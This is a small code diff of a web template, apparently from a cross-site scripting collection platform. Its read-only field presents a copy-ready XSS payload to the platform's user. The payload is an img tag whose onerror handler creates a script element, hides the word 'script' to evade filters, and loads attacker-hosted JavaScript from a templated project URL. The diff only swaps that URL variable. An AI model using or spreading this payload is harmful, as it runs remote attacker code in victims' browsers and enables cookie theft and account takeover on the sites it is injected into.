@@ -150,7 +150,7 @@
 										<div class="am-u-sm-9">
 											<input type="text" class="tpl-form-input" id="user-name"
 												readonly="readonly"
-												value="&lt;img src=x onerror=s=createElement('scrmipt'.replace('m',''));body.appendChild(s);s.src='${projectInfo.unionUrl }';&gt;">
+												value="&lt;img src=x onerror=s=createElement('scrmipt'.replace('m',''));body.appendChild(s);s.src='${projectInfo.sortUri }';&gt;">
 										</div>
 									</div>
 									<div class="am-form-group">
